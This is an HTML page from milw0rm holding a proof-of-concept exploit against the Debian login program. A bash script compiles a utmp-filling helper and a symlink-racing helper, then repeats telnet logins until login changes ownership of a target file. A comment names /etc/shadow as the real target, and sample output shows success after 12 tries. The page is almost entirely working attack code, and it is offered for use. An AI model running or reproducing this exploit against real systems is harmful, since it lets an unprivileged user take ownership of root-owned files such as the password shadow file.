<html><head><title>Debian GNU/Linux (symlink attack in login)  Arbitrary File Ownership PoC</title></head><pre>#!/bin/bash -

echo '
	#include &lt;string.h&gt;
	#include &lt;stdlib.h&gt;
	#include &lt;unistd.h&gt;
	#include &lt;utmp.h&gt;
	#include &lt;sys/types.h&gt;
	#include &lt;stdio.h&gt;

	int main(int argc, char *argv[])
	{
	  struct utmp entry;
	  int i;

	  entry.ut_type=LOGIN_PROCESS;
	  strcpy(entry.ut_line,&quot;/tmp/x&quot;);
	  entry.ut_time=0;
	  strcpy(entry.ut_user,&quot;badguy&quot;);
	  strcpy(entry.ut_host,&quot;badhost&quot;);
	  entry.ut_addr=0;
	  for(i=1;i&lt;9;i++) {
	    entry.ut_pid=(pid_t)( i + (int)getpid() );
	    sprintf(entry.ut_id,&quot;bad%d&quot;,i);
	    pututline(&amp;entry);
	  }
	}
' &gt; /tmp/fillutmp.c

cc -o /tmp/fillutmp /tmp/fillutmp.c

echo 'Ask someone with group utmp privileges to do:'
echo '  chgrp utmp /tmp/fillutmp; chmod 2755 /tmp/fillutmp'
echo -n 'Press [RETURN] to continue... '
read ANS

echo '
	#include &lt;unistd.h&gt;

	int main(int argc, char *argv[])
	{
	  while(1)
	  {
	    unlink(&quot;/tmp/x&quot;);
	    symlink(argv[1],&quot;/tmp/x&quot;);
	    unlink(&quot;/tmp/x&quot;);
	    symlink(argv[2],&quot;/tmp/x&quot;);
	  }
	}
' &gt; /tmp/jigglelnk.c

cc -o /tmp/jigglelnk /tmp/jigglelnk.c

HOST=`hostname` # or simply localhost?
echo &quot;Which tty do you think a 'telnet $HOST' will use next?&quot;
echo &quot;(Do that telnet and see...)&quot;
read TTY
echo &quot;You said it will be '$TTY' ...&quot;

ATK=/etc/debian_version # should be /etc/shadow

echo &quot;Starting symlink re-jiggler ...&quot;
/tmp/jigglelnk $TTY $ATK &amp;
JIG=$!

LOOP=0
while :; do
  ((LOOP = $LOOP + 1))
  echo; echo; echo &quot;Try = $LOOP&quot;

  /tmp/fillutmp

  echo &quot;Telnetting... if login succeeds, just exit for next try...&quot;
  /usr/bin/telnet $HOST

  LS=`ls -ld $ATK`
  case &quot;$LS&quot; in
    *root*root* ) ;; # not done yet...
    * )
      echo; echo
      echo &quot;Success after $LOOP tries!&quot;
      echo &quot;$LS&quot;
      echo; echo
      break
    ;;
  esac
done

kill $JIG
rm /tmp/fillutmp /tmp/jigglelnk /tmp/x

# ...
# ~$ logout
# Connection closed by foreign host.
# Success after 12 tries!
# -rw------- 1 psz tty 4 Oct 28  2006 /etc/debian_version

# milw0rm.com [2008-12-01]</pre></html>